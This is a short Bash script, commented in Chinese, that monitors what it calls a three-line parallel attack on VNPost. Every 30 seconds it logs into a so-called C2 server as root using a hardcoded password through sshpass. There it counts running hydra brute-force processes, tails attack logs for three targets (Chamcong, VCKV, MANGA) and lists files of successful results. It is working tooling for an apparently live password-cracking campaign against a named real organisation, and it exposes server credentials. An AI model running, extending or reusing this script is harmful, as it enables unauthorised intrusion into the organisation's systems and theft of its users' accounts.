#!/bin/bash
# 监控所有攻击线

while true; do
    clear
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "🎯 VNPost三线并行攻击实时监控"
    echo "时间: $(date '+%Y-%m-%d %H:%M:%S')"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    echo -e "\n[📊 C2服务器状态]"
    sshpass -p '@admin1314@' ssh -o StrictHostKeyChecking=no -p 2233 root@82.29.71.156 \
        "ps aux | grep -E 'hydra|dual_attack' | grep -v grep | wc -l" 2>/dev/null | \
        xargs -I {} echo "  活跃进程数: {}"
    
    echo -e "\n[🔥 攻击线1: Chamcong]"
    sshpass -p '@admin1314@' ssh -o StrictHostKeyChecking=no -p 2233 root@82.29.71.156 \
        "tail -3 /root/vnpost_attack/chamcong_attack.log 2>/dev/null || echo '  等待日志...'"
    
    echo -e "\n[🔥 攻击线2: VCKV]"
    sshpass -p '@admin1314@' ssh -o StrictHostKeyChecking=no -p 2233 root@82.29.71.156 \
        "tail -3 /root/vnpost_attack/vckv_attack.log 2>/dev/null || echo '  等待日志...'"
    
    echo -e "\n[🔥 攻击线3: MANGA (后台)]"
    sshpass -p '@admin1314@' ssh -o StrictHostKeyChecking=no -p 2233 root@82.29.71.156 \
        "tail -3 /root/vnpost_attack/corrected_output.log 2>/dev/null || echo '  持续运行中...'"
    
    echo -e "\n[✅ 成功结果检查]"
    sshpass -p '@admin1314@' ssh -o StrictHostKeyChecking=no -p 2233 root@82.29.71.156 \
        "ls -lh /root/vnpost_attack/*results*.txt 2>/dev/null | tail -5 || echo '  暂无结果文件'"
    
    echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "按Ctrl+C停止监控"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    sleep 30
done
